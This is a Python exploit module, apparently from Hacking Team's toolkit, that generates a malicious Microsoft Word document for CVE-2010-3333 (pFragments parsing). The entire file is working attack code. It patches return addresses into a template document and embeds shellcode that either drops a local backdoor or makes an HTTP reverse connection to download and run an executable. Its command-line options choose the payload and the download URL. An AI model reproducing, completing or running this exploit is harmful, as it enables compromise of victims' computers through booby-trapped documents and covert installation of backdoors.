#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod

# Microsoft Word 0day


import os
import sys
import math
import warnings
import binascii

import time
import struct
import random
import zlib
import copy
import zipfile

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")


import jscript_unicode
import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import zlib
import x86shelldrop

from resources import compressedfile

NAME='Microsoft Word 2007-2003-2002 Document pFragments Keyword Exploit' 
DESCRIPTION='This module exploits a vulnerability in Word triggered by an invalid parsing of the pFragment object type'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://www.microsoft.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Word XP SP3/2003SP3/2007SP2'
DOCUMENTATION['CVE']='CVE-2010-3333'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3333"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Microsoft'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP3/VISTA/SEVEN with Microsoft Office XP/2003/2007
Windows Vista
Windows SEVEN
"""

CHANGELOG="""
"""

# Global payload
payload = 0

extraPath = None

class exploit():
	def __init__(self, inputFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg
		self.outputFile = outputFile

		#self.source_pdf = 'resources/blank.pdf'
		self.infile = inputFile
		
		return

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename

	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def make_doc(self):
		input = bytearray(zlib.decompress(compressedfile))
		#input = bytearray(self.compressedfile)
		
		#secondstage = 
		shellcode = self.createShellcode()

		for i in range(0,2*4):
			input[0x6ACB + i] = binascii.hexlify(b"\xB0\x75\x58\x27")[i]
			input[0x6B03 + i] = binascii.hexlify(b"\x4A\xF4\x5E\x27")[i]

		_shellcode = binascii.hexlify(shellcode)
		
		for i in range(0,len(_shellcode)):
			input[0x6B37 + i] = _shellcode[i]
		
		print "Creating %s zip file archive"%(self.outputFile)
		f = open(self.outputFile,mode='wb')
		f.write(input)
		f.close()
		
		return 0

	def run(self):
		return self.make_doc()


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	app=exploit(sys.argv[2], sys.argv[3], dbg)
	app.run()
	
	print ' ... done'